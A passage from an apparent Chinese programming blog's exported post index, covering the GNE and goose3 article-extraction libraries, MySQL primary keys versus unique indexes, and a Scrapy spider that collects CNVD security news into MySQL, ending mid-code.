内容。\n安全研究员早在微软于7月份交付 Windows 常规更新一天后就注意到这个 VBScript 漏洞遭利用。该漏洞的 CVE 编号是 CVE-2018-8373，已在本月的补丁日修复。它是一个使用后释放内存破坏漏洞，能让攻击者在受攻陷计算机上运行 shellcode。\n参考链接：\nhttps:&#x2F;&#x2F;www.bleepingcomputer.com&#x2F;news&#x2F;security&#x2F;zero-day-in-microsofts-vbscript-engine-used-by-darkhotel-apt&#x2F;\n（编辑：CNVD）\xa0|\n已有0条评论&#39;, &#39;images&#39;: [&#39;&#x2F;images&#x2F;pinglun.png&#39;]&#125;</span><br></pre></td></tr></table></figure><p>除了title的xpath还可以指定<strong>Author XPath</strong>、<strong>Publish Time XPath</strong>。</p><p>对大多数新闻页面而言，以上的写法就能够解决问题了。但某些新闻网页下面会有评论，评论里面可能存在长篇大论，它们会看起来比真正的新闻正文更像是正文，因此extractor.extract()方法还有一个默认参数noise_node_list，用于在网页预处理时提前把评论区域整个移除。<strong>noise_mode_list</strong>的值是一个列表，列表里面的每一个元素都是 XPath，对应了你需要提前移除的，可能会导致干扰的目标标签。</p><p>例如，观察者网下面的评论区域对应的Xpath 为//div[@class=”comment-list”]。所以在提取观察者网时，为了防止评论干扰，就可以加上这个参数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">result &#x3D; extractor.extract(html, noise_node_list&#x3D;[&#39;&#x2F;&#x2F;div[@class&#x3D;&quot;comment-list&quot;]&#39;])</span><br></pre></td></tr></table></figure><h3 id="体验-GNE-的提取效果，可以访问http-122-51-39-219-。"><a href="#体验-GNE-的提取效果，可以访问http-122-51-39-219-。" class="headerlink" title="体验 GNE 的提取效果，可以访问http://122.51.39.219/。"></a>体验 GNE 的提取效果，可以访问<a href="http://122.51.39.219/%E3%80%82">http://122.51.39.219/。</a></h3>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 正文提取 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>正文提取第三方库goose</title>
      <link href="2020/03/24/2020-03-24-Text_extraction_third-party_library_goose/"/>
      <url>2020/03/24/2020-03-24-Text_extraction_third-party_library_goose/</url>
      
        <content type="html"><![CDATA[<h1 id="Python爬虫-正文提取第三方库goose"><a href="#Python爬虫-正文提取第三方库goose" class="headerlink" title="Python爬虫:正文提取第三方库goose"></a>Python爬虫:正文提取第三方库goose</h1><p>爬虫抓取数据有两个头疼的点，写过爬虫的小伙伴们一定都深有体会：</p><ul><li><p><strong>网站的反爬机制</strong></p><p>你要尽可能将自己伪装成“一个人”，骗过对方的服务器反爬验证。</p></li><li><p><strong>网站的内容提取</strong></p><p>每个网站都需要你做不同的处理，而且网站一旦改版，你的代码也得跟着更新。</p></li></ul><p>第一点没什么捷径可走，套路见得多了，也就有经验了。关于第二点，今天咱们就来介绍一个小工具，在某些需求场景下，或许可以给你省不少事。那就是爬虫万金油——正文提取第三方库goose。</p><h3 id="Goose是什么"><a href="#Goose是什么" class="headerlink" title="Goose是什么"></a>Goose是什么</h3><p>Goose 是一个 文章内容提取器 ，可以从任意资讯文章类的网页中提取 文章主体 ，并提取 标题、标签、摘要、图片、视频 等信息，且 支持中文 网页。它最初是由 http:// Gravity.com 用 Java 编写的。python-goose 是用 Python 重写的版本，只支持到 python 2.7。 python 3 的版本为goose3。我主要使用python3，故本文讲解的是goose3。 </p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>pip install goose3</p><h3 id="快速上手"><a href="#快速上手" class="headerlink" title="快速上手"></a>快速上手</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># *-* coding:utf-8 *-*</span></span><br><span class="line"><span class="keyword">from</span> goose3 <span class="keyword">import</span> Goose</span><br><span class="line"><span class="keyword">from</span> goose3.text <span class="keyword">import</span> StopWordsChinese</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化，设置中文分词</span></span><br><span class="line">g = Goose(&#123;<span class="string">&#x27;stopwords_class&#x27;</span>: StopWordsChinese&#125;)</span><br><span class="line"><span class="comment"># 文章地址</span></span><br><span class="line">url = <span class="string">&#x27;https://www.cnvd.org.cn/webinfo/show/4653&#x27;</span></span><br><span class="line"><span class="comment"># 获取文章内容</span></span><br><span class="line">article = g.extract(url=url)</span><br><span class="line"><span class="comment"># 也可以直接利用网页源代码</span></span><br><span class="line"><span class="comment"># raw_html = &#x27;&#x27;&#x27;&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># article = g.extract(raw_html=raw_html)</span></span><br><span class="line"><span class="comment"># 标题</span></span><br><span class="line">print(<span class="string">&#x27;标题：&#x27;</span>, article.title)</span><br><span class="line"><span class="comment"># 显示正文</span></span><br><span class="line">print(article.cleaned_text)</span><br></pre></td></tr></table></figure><p>除了标题 title 和正文 cleaned_text 外，还可以获取一些额外的信息，比如：</p><ul><li><p>meta_description ：摘要</p></li><li><p>meta_keywords ：关键词</p></li><li><p>tags ：标签</p></li><li><p>top_image ：主要图片</p></li><li><p>infos ：包含所有信息的 dict</p></li><li><p>raw_html ：原始 HTML 文本</p></li></ul><p>如有有些网站限制了程序抓取，也可以根据需要添加 user-agent 信息：</p><p>g = Goose({‘browser_user_agent’: ‘Version/5.1.2 Safari/534.52.7’})</p><p>对于 goose3，因为使用了 requests 库作为请求模块，因此还可以以相似方式配置 headers、proxies 等属性。在上述示例中使用到的 StopWordsChinese 为中文分词器，可一定程度上提高中文文章的识别准确率，但更耗时。</p><p>Goose 虽然方便，但并不能保证每个网站都能精确获取，因此适合大规模文章的采集 ，如热点追踪、舆情分析等。它只能从概率上保证大多数网站可以相对准确地抓取。抓取英文网站优于中文网站，主流网站优于小众网站，文本的提取优于图片的提取。</p><p>除了 goose 外，还有其他的正文提取库可以尝试，比如 python-boilerpipe、python-readability 、gne等。</p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 爬虫 </tag>
            
            <tag> python </tag>
            
            <tag> goose </tag>
            
            <tag> 正文提取 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mysql防止重复数据 主键和唯一索引比较</title>
      <link href="2020/03/23/2020-03-23-mysql_prevents_duplicate_data_PrimaryKey_vs_UniqueIndex/"/>
      <url>2020/03/23/2020-03-23-mysql_prevents_duplicate_data_PrimaryKey_vs_UniqueIndex/</url>
      
        <content type="html"><![CDATA[<h1 id="mysql防止重复数据-主键和唯一索引比较"><a href="#mysql防止重复数据-主键和唯一索引比较" class="headerlink" title="mysql防止重复数据 主键和唯一索引比较"></a>mysql防止重复数据 主键和唯一索引比较</h1><h3 id="主键和唯一索引都可以防止添加重复数据。"><a href="#主键和唯一索引都可以防止添加重复数据。" class="headerlink" title="主键和唯一索引都可以防止添加重复数据。"></a>主键和唯一索引都可以防止添加重复数据。</h3><h3 id="主键和索引的区别"><a href="#主键和索引的区别" class="headerlink" title="主键和索引的区别"></a>主键和索引的区别</h3><ul><li>主键一定会创建一个唯一索引，但是有唯一索引的列不一定是主键；    </li><li>主键不允许为空值，唯一索引列允许空值；    </li><li>一个表只能有一个主键，但是可以有多个唯一索引；    </li><li>主键可以被其他表引用为外键，唯一索引列不可以；    </li><li>主键是一种约束，而唯一索引是一种索引，是表的冗余数据结构，两者有本质的差别</li></ul><h3 id="索引是什么-amp-优缺点"><a href="#索引是什么-amp-优缺点" class="headerlink" title="索引是什么&amp;优缺点"></a>索引是什么&amp;优缺点</h3><p>索引就是一个数据结构，我们把表中的记录用一个适合高效查找的数据结构来表示，目的就是让查询变得更高效。索引的运作方式推荐查看<a href="https://www.zhihu.com/question/26113830/answer/908074473%E3%80%82%E4%B8%BB%E8%A6%81%E9%9C%80%E8%A6%81%E4%BA%86%E8%A7%A3%E4%BA%8C%E5%8F%89%E6%A0%91%E3%80%81%E5%B9%B3%E8%A1%A1%E4%BA%8C%E5%8F%89%E6%A0%91%E3%80%81B%E6%A0%91%E3%80%81B+%E6%A0%91%E3%80%82%E7%B4%A2%E5%BC%95%E5%8F%AF%E4%BB%A5%E5%A4%A7%E5%A4%A7%E6%8F%90%E9%AB%98MySQL%E7%9A%84%E6%A3%80%E7%B4%A2%E9%80%9F%E5%BA%A6%EF%BC%8C%E4%BD%86%E4%B9%9F%E6%9C%89%E7%BC%BA%E7%82%B9%EF%BC%8C%E4%BC%9A%E9%99%8D%E4%BD%8E%E6%9B%B4%E6%96%B0%E8%A1%A8%E7%9A%84%E9%80%9F%E5%BA%A6%EF%BC%8C%E5%A6%82%E5%AF%B9%E8%A1%A8%E8%BF%9B%E8%A1%8CINSERT%E3%80%81UPDATE%E5%92%8CDELETE%E3%80%82%E5%9B%A0%E4%B8%BA%E6%9B%B4%E6%96%B0%E8%A1%A8%E6%97%B6%EF%BC%8CMySQL%E4%B8%8D%E4%BB%85%E8%A6%81%E4%BF%9D%E5%AD%98%E6%95%B0%E6%8D%AE%EF%BC%8C%E8%BF%98%E8%A6%81%E4%BF%9D%E5%AD%98%E4%B8%80%E4%B8%8B%E7%B4%A2%E5%BC%95%E6%96%87%E4%BB%B6%EF%BC%8C%E5%BB%BA%E7%AB%8B%E7%B4%A2%E5%BC%95%E4%BC%9A%E5%8D%A0%E7%94%A8%E7%A3%81%E7%9B%98%E7%A9%BA%E9%97%B4%E7%9A%84%E7%B4%A2%E5%BC%95%E6%96%87%E4%BB%B6%E3%80%82">https://www.zhihu.com/question/26113830/answer/908074473。主要需要了解二叉树、平衡二叉树、B树、B+树。索引可以大大提高MySQL的检索速度，但也有缺点，会降低更新表的速度，如对表进行INSERT、UPDATE和DELETE。因为更新表时，MySQL不仅要保存数据，还要保存一下索引文件，建立索引会占用磁盘空间的索引文件。</a> </p>]]></content>
      
      
      <categories>
          
          <category> 环境配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql </tag>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Scrapy爬虫入门（一） 怎么写怎么运行</title>
      <link href="2020/03/22/2020-03-22-Scrapy_spiders_1_how_to_write_and_run/"/>
      <url>2020/03/22/2020-03-22-Scrapy_spiders_1_how_to_write_and_run/</url>
      
        <content type="html"><![CDATA[<h1 id="Scrapy爬虫入门（一）-怎么写怎么运行"><a href="#Scrapy爬虫入门（一）-怎么写怎么运行" class="headerlink" title="Scrapy爬虫入门（一） 怎么写怎么运行"></a>Scrapy爬虫入门（一） 怎么写怎么运行</h1><h3 id="自写爬虫基类-amp-Scrapy框架"><a href="#自写爬虫基类-amp-Scrapy框架" class="headerlink" title="自写爬虫基类&amp;Scrapy框架"></a>自写爬虫基类&amp;Scrapy框架</h3><p>由于课题需求，前期是利用自己写的基类，日志功能不完善，爬虫效率低，虽然改起来得心应手，但是是称不上是一个完善的框架，缺乏很多功能。之前个人不喜欢 scrapy 原因是，自己代码水平较低，功底不足，而scrapy对于初学者太复杂了。经过一段时间的学习，个人提升了一些编程能力代码能力。故而重新认识Scrapy框架。</p><p>Scrapy框架把爬虫的逻辑分为了几个模块，让程序员只需要去关注抓取数据的逻辑而不是调度的逻辑，而且内置了很多的中间键供自定义你的爬虫，代理动态ua、selenium、splash都可以在中间键实现，而且日志系统很强大。</p><h3 id="课题需求"><a href="#课题需求" class="headerlink" title="课题需求"></a>课题需求</h3><p>课题需求是制作一个网络安全资讯、漏洞信息的爬虫，每天定时爬取。查阅相关资料后发现，Scrapy应该是可以满足需求。</p><h4 id="1-简单设计数据库："><a href="#1-简单设计数据库：" class="headerlink" title="1.简单设计数据库："></a>1.简单设计数据库：</h4><p>设计两张表SecNews和VulnInfo，分别存放安全资讯以及漏洞信息。</p><p>SecNews:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">hash</span><br><span class="line">name</span><br><span class="line">url</span><br><span class="line">src</span><br><span class="line">post_date</span><br><span class="line">body</span><br><span class="line">crawl_time</span><br></pre></td></tr></table></figure><p>VulnInfo:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">hash</span><br><span class="line">name</span><br><span class="line">url</span><br><span class="line">CVE</span><br><span class="line">risk</span><br><span class="line">platform</span><br><span class="line">category</span><br><span class="line">post_date</span><br><span class="line">src</span><br><span class="line">vuln_desc</span><br><span class="line">code</span><br><span class="line">crawl_time</span><br></pre></td></tr></table></figure><p>其中，hash值是为了增量爬取（更新数据）。</p><h4 id="2-安装Scrapy"><a href="#2-安装Scrapy" class="headerlink" title="2.安装Scrapy"></a>2.安装Scrapy</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install scrapy</span><br></pre></td></tr></table></figure><p>在python中测试是否安装成功：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;import scrapy</span><br><span class="line">&gt;&gt;&gt;scrapy.version_info</span><br></pre></td></tr></table></figure><p>在shell中测试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scrapy</span><br></pre></td></tr></table></figure><h4 id="3-尝试编写第一个爬虫"><a href="#3-尝试编写第一个爬虫" class="headerlink" title="3.尝试编写第一个爬虫"></a>3.尝试编写第一个爬虫</h4><h5 id="（1）创建项目"><a href="#（1）创建项目" class="headerlink" title="（1）创建项目"></a>（1）创建项目</h5><p>我想对国家信息安全漏洞共享平台的热点新闻进行爬取，故新建Scrapy项目</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">scrapy startproject secnews_spiders</span><br><span class="line">cd secnews_spiders</span><br></pre></td></tr></table></figure><h5 id="（2）分析页面"><a href="#（2）分析页面" class="headerlink" title="（2）分析页面"></a>（2）分析页面</h5><p><strong>分页：</strong></p><p>先分析其页面<a href="https://www.cnvd.org.cn/webinfo/list?type=2%EF%BC%8C%E5%85%B6%E9%80%9A%E8%BF%87offset%E5%81%8F%E7%A7%BB%E5%80%BC%E5%88%86%E9%A1%B5">https://www.cnvd.org.cn/webinfo/list?type=2，其通过offset偏移值分页</a></p><p>例如第一页是<a href="https://www.cnvd.org.cn/webinfo/list?type=2&amp;max=20&amp;offset=0">https://www.cnvd.org.cn/webinfo/list?type=2&amp;max=20&amp;offset=0</a></p><p>第五页是<a href="https://www.cnvd.org.cn/webinfo/list?type=2&amp;max=20&amp;offset=80">https://www.cnvd.org.cn/webinfo/list?type=2&amp;max=20&amp;offset=80</a></p><p>最后一页是<a href="https://www.cnvd.org.cn/webinfo/list?type=2&amp;max=20&amp;offset=1040">https://www.cnvd.org.cn/webinfo/list?type=2&amp;max=20&amp;offset=1040</a></p><p><strong>新闻信息</strong>：</p><ul><li>标题在h1标签中</li><li>发布时间在div class=”artInfo”中</li><li>内容在div id=”artibody”中 </li></ul><h5 id="（3）表去重"><a href="#（3）表去重" class="headerlink" title="（3）表去重"></a>（3）表去重</h5><p>通过url的hash值来判断</p><h5 id="（4）数据入库"><a href="#（4）数据入库" class="headerlink" title="（4）数据入库"></a>（4）数据入库</h5><h4 id=""><a href="#" class="headerlink" title=""></a></h4><h4 id="4-爬虫结构"><a href="#4-爬虫结构" class="headerlink" title="4.爬虫结构"></a>4.爬虫结构</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">secnews_spiders</span><br><span class="line">    │  items.py</span><br><span class="line">    │  middlewares.py</span><br><span class="line">    │  pipelines.py</span><br><span class="line">    │  settings.py</span><br><span class="line">    │  __init__.py</span><br><span class="line">    ├─spiders</span><br><span class="line">    │   CNVD_spiders.py</span><br><span class="line">    │   __init__.py</span><br></pre></td></tr></table></figure><ul><li>items.py 用来封装爬取到的数据。</li><li>middlewares.py 中间件是Scrapy里面的一个核心概念。使用中间件可以在爬虫的请求发起之前或者请求返回之后对数据进行定制化修改，从而开发出适应不同情况的爬虫。</li><li>pipelines.py 用来处理数据，一个项目中可以启用多个Item Pipeline，按指定次序级联，形成数据处理流水线。</li><li>settings.py 配置文件，可以配置User-Agent请求头、HTTP请求默认使用的请求头、智能限速、下载器总共最大处理的并发请求数、下载延迟、爬虫深度等等。</li></ul><h4 id="具体代码："><a href="#具体代码：" class="headerlink" title="具体代码："></a>具体代码：</h4><p>CNVD_spiders.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"><span class="keyword">from</span> scrapy.linkextractors <span class="keyword">import</span> LinkExtractor</span><br><span class="line"><span class="keyword">from</span> ..items <span class="keyword">import</span> SecnewsSpidersItem</span><br><span class="line"><span class="keyword">from</span> w3lib.html <span class="keyword">import</span> remove_tags</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CNVD_Spider</span>(<span class="params">scrapy.Spider</span>):</span></span><br><span class="line">    name = <span class="string">&quot;CNVD&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 初始爬取列表</span></span><br><span class="line">    start_urls = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">40</span>, <span class="number">20</span>):</span><br><span class="line">        start_urls.append(<span class="string">&#x27;https://www.cnvd.org.cn/webinfo/list?type=2&amp;max=20&amp;offset=%d&#x27;</span>%i)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 实现新闻列表页面的解析函数</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse</span>(<span class="params">self, response</span>):</span></span><br><span class="line">        links = response.css(<span class="string">&#x27;tbody&gt;tr a::attr(href)&#x27;</span>).extract()</span><br><span class="line">        <span class="keyword">for</span> link <span class="keyword">in</span> links:</span><br><span class="line">            link = <span class="string">&#x27;https://www.cnvd.org.cn&#x27;</span>+link</span><br><span class="line">            <span class="comment"># print(link)</span></span><br><span class="line">            <span class="keyword">yield</span> scrapy.Request(link,callback=self.parse_news)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 实现新闻页面的解析函数</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse_news</span>(<span class="params">self,response</span>):</span></span><br><span class="line">        news = SecnewsSpidersItem()</span><br><span class="line">        news[<span class="string">&#x27;hash&#x27;</span>] = self.urlhash(response.url)</span><br><span class="line">        news[<span class="string">&#x27;name&#x27;</span>] = response.xpath(<span class="string">&#x27;.//h1/text()&#x27;</span>).extract_first()</span><br><span class="line">        news[<span class="string">&#x27;url&#x27;</span>] = response.url</span><br><span class="line">        news[<span class="string">&#x27;src&#x27;</span>] = <span class="string">&#x27;CNVD&#x27;</span></span><br><span class="line">        news[<span class="string">&#x27;post_date&#x27;</span>] = response.css(<span class="string">&#x27;[class=artInfo]::text&#x27;</span>).extract_first().strip(<span class="string">&#x27;\n\t&#x27;</span>)[<span class="number">0</span>:<span class="number">10</span>]</span><br><span class="line">        news[<span class="string">&#x27;body&#x27;</span>] = remove_tags(response.css(<span class="string">&#x27;[id=artibody]&#x27;</span>).extract_first()).strip(<span class="string">&#x27;\n\t &#x27;</span>)</span><br><span class="line">        news[<span class="string">&#x27;crawl_time&#x27;</span>] = datetime.datetime.now().strftime(<span class="string">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        print(news)</span><br><span class="line">        <span class="keyword">yield</span> news</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">urlhash</span>(<span class="params">self,url</span>):</span></span><br><span class="line">        md5 = hashlib.md5()</span><br><span class="line">        md5.update(url.encode())</span><br><span class="line">        result = md5.hexdigest()</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>items.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SecnewsSpidersItem</span>(<span class="params">scrapy.Item</span>):</span></span><br><span class="line">    <span class="comment"># define the fields for your item here like:</span></span><br><span class="line">    <span class="built_in">hash</span> = scrapy.Field()</span><br><span class="line">    name = scrapy.Field()</span><br><span class="line">    url = scrapy.Field()</span><br><span class="line">    src = scrapy.Field()</span><br><span class="line">    post_date = scrapy.Field()</span><br><span class="line">    body = scrapy.Field()</span><br><span class="line">    crawl_time = scrapy.Field()</span><br></pre></td></tr></table></figure><p>pipelines.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pymysql</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MySQLPipeline</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 打开数据库</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">open_spider</span>(<span class="params">self, spider</span>):</span></span><br><span class="line">        db = spider.settings.get(<span class="string">&#x27;MYSQL_DB_NAME&#x27;</span>,<span class="string">&#x27;clearmonitor&#x27;</span>)</span><br><span class="line">        host = spider.settings.get(<span class="string">&#x27;MYSQL_HOST&#x27;</span>, <span class="string">&#x27;localhost&#x27;</span>)</span><br><span class="line">        port = spider.settings.get(<span class="string">&#x27;MYSQL_PORT&#x27;</span>, <span class="number">3306</span>)</span><br><span class="line">        user = spider.settings.get(<span class="string">&#x27;MYSQL_USER&#x27;</span>, <span class="string">&#x27;root&#x27;</span>)</span><br><span class="line">        passwd = spider.settings.get(<span class="string">&#x27;MYSQL_PASSWORD&#x27;</span>, <span class="string">&#x27;123456&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        self.db_conn =pymysql.connect(host=host, port=port, db=db, user=user, passwd=passwd, charset=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">        self.db_cur = self.db_conn.cursor()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 关闭数据库</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">close_spider</span>(<span class="params">self, spider</span>):</span></span><br><span class="line">        self.db_conn.commit()</span><br><span class="line">        self.db_conn.close()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 对数据进行处理</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">process_item</span>(<span class="params">self, item, spider</span>):</span></span><br><span class="line">        self.insert_db(item)</span><br><span class="line">        <span class="keyword">return</span> item</span><br><span class="line"></span><br><span class="line">    <span class="comment">#插入数据</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">insert_db</span>(<span class="params">self, item</span>):</span></span><br><span class="line">        values = (</span><br><span class="line">            item[<span class="string">&#x27;hash&#x27;</span>],</span><br><span class="line">            item[<span class="string">&#x27;name&#x27;</span>],</span><br><span class="line">            item[<span class="string">&#x27;url&#x27;</span>],</span><br><span class="line">            item[<span class="string">&#x27;src&#x27;</span>],</span><br><span class="line">            item[<span class="string">&#x27;post_date&#x27;</span>],</span><br><span class="line">            item[<span class="string">&#x27;body&#x27;</span>],</span><br><span class="line">            item[<span class="string">&#x27;crawl_time&#x27;</span>],</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        sql = <span class="string">&#x27;INSERT INTO secnews VALUES(%s,%s,%s,%s,%s,%s,%s)&#x27;</span></span><br><span class="line">        self.db_cur.execute(sql, values)</span><br><span class="line">        </span><br><span class="line">        </span><br></pre></td></tr></table></figure><p>上述pipeline，先执行全部的插入语句，最后一次性调用commit方法提交给数据库。但是如果爬取时间很长，中途被迫中断，这样程序就不能执行到最后的commit。如果在上述代码的insert_db方法中直接添加commit()，又会使程序慢得无法接受。为了解决这个问题，利用Twisted提供的异步方式多线程访问数据库模块adbapi，可以显著提高程序访问数据库的效率。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> twisted.enterprise <span class="keyword">import</span> adbapi</span><br><span class="line"><span class="keyword">import</span> pymysql</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MySQLAsyncPipeline</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="comment"># 打开数据库</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">open_spider</span>(<span class="params">self, spider</span>):</span></span><br><span class="line">        db = spider.settings.get(<span class="string">&#x27;MYSQL_DB_NAME&#x27;</span>,<span class="string">&#x27;clearmonitor&#x27;</span>)</span><br><span class="line">        host = spider.settings.get(<span class="string">&#x27;MYSQL_HOST&#x27;</span>, <span class="string">&#x27;localhost&#x27;</span>)</span><br><span class="line">        port = spider.settings.get(<span class="string">&#x27;MYSQL_PORT&#x27;</span>, <span class="number">3306</span>)</span><br><span class="line">        user = spider.settings.get(<span class="string">&#x27;MYSQL_USER&#x27;</span>, <span class="string">&#x27;root&#x27;</span>)</span><br><span class="line">        passwd = spider.settings.get(<span class="string">&#x27;MYSQL_PASSWORD&#x27;</span>, <span class="string">&#x27;123456&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        self.dbpool = adbapi.ConnectionPool(<span class="string">&#x27;pymysql&#x27;</span>,host=host, port=port, db=db, user=user, passwd=passwd, charset=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line"></span><br><span 